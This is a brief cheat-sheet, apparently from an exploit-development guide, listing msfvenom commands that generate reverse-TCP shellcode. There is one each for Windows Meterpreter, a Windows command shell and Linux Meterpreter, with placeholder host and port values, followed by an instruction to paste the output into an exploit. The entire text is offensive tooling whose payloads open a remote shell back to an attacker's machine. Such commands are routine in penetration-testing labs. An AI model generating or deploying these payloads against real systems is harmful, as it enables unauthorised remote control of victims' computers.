1. Create your shellcode with msfvenom

Windows Meterpreter Reverse TCP Shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f <language>

Windwos Reverse TCP Shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> EXITFUNC=thread -f <language> -a <arch> -b <badchar>

Linux Meterpreter Reverse TCP Shellcode
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f <language>

2. Paste the output in the shellcode
